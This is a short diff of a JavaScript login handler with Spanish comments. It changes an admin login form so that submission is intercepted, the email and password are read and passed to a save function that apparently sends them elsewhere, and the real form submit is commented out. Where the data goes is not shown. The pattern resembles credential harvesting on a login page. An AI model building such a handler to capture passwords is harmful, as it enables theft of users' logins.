@@ -22,14 +22,13 @@ function guardarDatos(data) {
         .catch(error => console.error('Error:', error));
 }
 
-// Continúa con el envío del formulario si es necesario
-// Puedes redirigir o realizar otras acciones aquí
-document.getElementById('login-form-admin').submit();
-
+// Captura el evento de envío del formulario
+document.getElementById('login-form-admin').addEventListener('submit', function(event) {
+    event.preventDefault(); // Evita el comportamiento predeterminado de envío del formulario
 
     // Recopila datos del formulario
-    const email = $('#email_address_login').val();
-    const password = $('#password').val();
+    const email = document.getElementById('email_address_login').value;
+    const password = document.getElementById('password').value;
 
     // Guarda datos utilizando la función
     guardarDatos({
@@ -39,25 +38,6 @@ document.getElementById('login-form-admin').submit();
 
     // Continúa con el envío del formulario si es necesario
     // Puedes redirigir o realizar otras acciones aquí
-    document.getElementById('login-form-admin').submit();
+    // Aquí he comentado la siguiente línea para evitar la redirección
+    // document.getElementById('login-form-admin').submit();
 });
-
-    // Recopila datos del formulario
-    const email = $('#email_address_login').val();
-    const password = $('#password').val();
-
-    // Guarda datos utilizando la función
-    guardarDatos({
-        usuario: email,
-        contraseña: password,
-    });
-
-    // Continúa con el envío del formulario si es necesario
-    // Puedes redirigir o realizar otras acciones aquí
-    document.getElementById('login-form-admin').submit();
-});
-*/
-
-// Continúa con el envío del formulario si es necesario
-// Puedes redirigir o realizar otras acciones aquí
-document.getElementById('login-form-admin').submit();
